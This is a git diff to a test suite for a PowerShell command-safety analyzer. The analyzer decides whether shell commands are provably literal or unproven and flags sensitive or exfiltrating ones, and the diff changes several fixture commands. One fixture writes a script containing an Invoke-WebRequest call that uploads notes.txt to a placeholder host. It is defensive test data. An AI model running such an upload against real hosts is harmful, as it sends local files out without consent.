@@ -1,3 +1,4 @@
+import "../../__tests__/support/trusted-powershell.js";
 import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -15,8 +16,8 @@ describe("PowerShell static floor analysis", () => {
   it("keeps a literal dynamic-evaluation payload opaque but exact-rule eligible", () => {
     for (const command of [
       "Invoke-Expression 'Get-ChildItem'",
-      "bash -c 'npm test'",
-      "powershell -Command 'Write-Output ready'",
+      "bash --noprofile --norc -p -c 'npm test'",
+      "fish --no-config -c 'printf ready'",
     ]) {
       expect(proveLiteralPowerShell(command)).toEqual(expect.objectContaining({ proven: true }));
       expect(inspectPowerShellCommand(command, CWD)).toEqual(expect.objectContaining({
@@ -46,8 +47,8 @@ describe("PowerShell static floor analysis", () => {
 
   it("recognizes only positively parsed literal evaluators as exact-only", () => {
     for (const command of [
-      "node '--eval=console.log(1)'",
-      "fish --command 'printf ready'",
+      "python3 -I -S -c 'print(1)'",
+      "fish --no-config --command 'printf ready'",
     ]) {
       expect(inspectPowerShellCommand(command, CWD)).toEqual(expect.objectContaining({
         outcome: "unproven",
@@ -97,14 +98,14 @@ describe("PowerShell static floor analysis", () => {
     }
   });
 
-  it("keeps direct literal -File indirection exactable without reading the file", () => {
+  it("refuses a literal script when nested startup cannot be proved", () => {
     const root = mkdtempSync(join(tmpdir(), "ave-ps-static-"));
     const script = join(root, "task.ps1");
     try {
       writeFileSync(script, "Invoke-WebRequest https://x.invalid -InFile notes.txt");
       const command = `pwsh -File '${script}' literal-arg`;
-      expect(inspectPowerShellCommand(command, CWD)).toEqual({ outcome: "static-complete", sensitive: null, exfiltration: null });
-      expect(proveLiteralPowerShell(command)).toEqual(expect.objectContaining({ proven: true }));
+      expect(inspectPowerShellCommand(command, CWD)).toEqual(expect.objectContaining({ outcome: "unproven" }));
+      expect(proveLiteralPowerShell(command)).toEqual(expect.objectContaining({ proven: false }));
 
       for (const ambiguous of ["pwsh -f ./task.ps1", "pwsh -fi ./task.ps1", "pwsh -File -"]) {
         const result = inspectPowerShellCommand(ambiguous, CWD);
@@ -218,7 +219,7 @@ describe("PowerShell static floor analysis", () => {
   });
 
   it("does not mistake flags after an interpreter module or script operand for code", () => {
-    for (const command of ["python -m pytest -c pytest.ini", "python script.py -c data"]) {
+    for (const command of ["python3 -I -S script.py -c data"]) {
       const result = inspectPowerShellCommand(command, CWD);
       expect(result).toEqual({ outcome: "static-complete", sensitive: null, exfiltration: null });
       expect(result.exactLiteralEvaluation).toBeUndefined();
